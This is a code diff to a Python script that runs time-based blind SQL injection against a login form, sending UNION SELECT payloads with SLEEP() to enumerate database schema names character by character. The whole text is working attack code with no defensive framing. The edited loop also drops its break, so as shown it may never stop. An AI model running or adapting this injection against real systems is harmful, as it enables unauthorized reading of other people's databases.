@@ -3,13 +3,14 @@ import requests, string, time
 
 CHARACTER_SET =  string.ascii_letters + string.digits
 SESSION = requests.Session()
-ARBITARY_SLEEP_TIME = 5
+ARBITARY_SLEEP_TIME = 3
 URI = 'https://example.com'
 HTTP_HEADERS = {
     'User-Agent': 'Your Bot 1.0'
 }
 HTTP_DATA = {
-    'username': ''
+    'username': '',
+    'password': 'foo'
 }
 
 def run_payload(payload):
@@ -23,29 +24,34 @@ def run_payload(payload):
 
 # aka database names
 def fetch_schema():
-    payload = '\' UNION SELECT information_schema.schemeta WHERE SCHEMA_NAME LIKE BINARY '
     schema_list = []
+    # change payload and temp_payload as per use case
+    payload = "foo' UNION SELECT schema_name from information_schema.schemata WHERE SCHEMA_NAME LIKE BINARY "
     for character in CHARACTER_SET:
-        payload += payload + f'${character}% ' + f'SLEEP(${ARBITARY_SLEEP_TIME}) -- '
-        # if it's a match!
-        if run_payload(payload):
+        temp_payload = payload + f'"{character}%" ' + 'AND ' + f'SLEEP({ARBITARY_SLEEP_TIME}) -- '
+
+        if run_payload(temp_payload):
+            print(f'fetch_schema:run_payload:payload: {temp_payload}')
             schema_name = character
-            temp_schema_name = ''
+            temp_schema_name = schema_name
             while True:
-                for index, try_character in enumerate(CHARACTER_SET):
-                    payload += payload + f'${schema_name}${c}% ' + f'SLEEP(${ARBITARY_SLEEP_TIME}) -- '
-                    temp_schema_name = schema_name
-                    if run_payload(payload):
+                for try_character in CHARACTER_SET:
+                    temp_payload = payload + f'"{schema_name}{try_character}%" ' + 'AND ' + f'SLEEP({ARBITARY_SLEEP_TIME}) -- '
+                    # Gracefully sleep for a while
+                    time.sleep(0.5)
+                    if run_payload(temp_payload):
                         schema_name += try_character
-                # We founda a schema name!
+                        print(f'SCHEMA NAME:- {schema_name}')
+
                 if schema_name == temp_schema_name:
-                    print(f'Schema found in wild ${schema_name}')
+                    print(f'Schema found in wild {schema_name}')
                     schema_list.append(schema_name)
-                    break
     return schema_list
 
+# TODO
 def fetch_tables(schema_list):
     pass
 
 if __name__ == '__main__':
-    pass
+    schema_list = fetch_schema()
+    print('SCHEMAS:- ', schema_list)
